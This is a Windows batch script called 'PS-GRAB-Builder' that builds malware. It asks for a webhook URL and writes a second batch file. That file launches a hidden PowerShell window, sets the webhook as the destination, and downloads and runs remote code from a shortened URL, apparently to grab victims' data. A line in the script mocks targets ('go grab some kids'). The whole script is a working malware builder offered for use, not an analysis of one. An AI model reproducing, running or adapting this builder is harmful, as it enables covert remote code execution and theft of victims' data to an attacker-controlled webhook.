@echo off
color 06

mode 140, 10

Title PS-GRAB-Builder


DEL /F /Q PS-GRAB_Builded.bat

cls

:start


Echo Set the webhook
SET /P variable= Here: 
Title PS-GRAB-Builder: %variable%

IF "%variable%"=="" GOTO start2
cls
echo -----------------------------------
Echo WebHook = %variable%
echo -----------------------------------
echo.
echo ez now go grab some kids

SET hook2='%variable%'

echo @echo off >> PS-GRAB_Builded.bat
echo powershell -windowstyle hidden $webHookUrl=%hook2%;iex((iwr shorturl.at/biVZ5).content) >> PS-GRAB_Builded.bat


pause >nul
exit
 

:start2
echo You need to set a webhook
pause >nul
cls
goto start 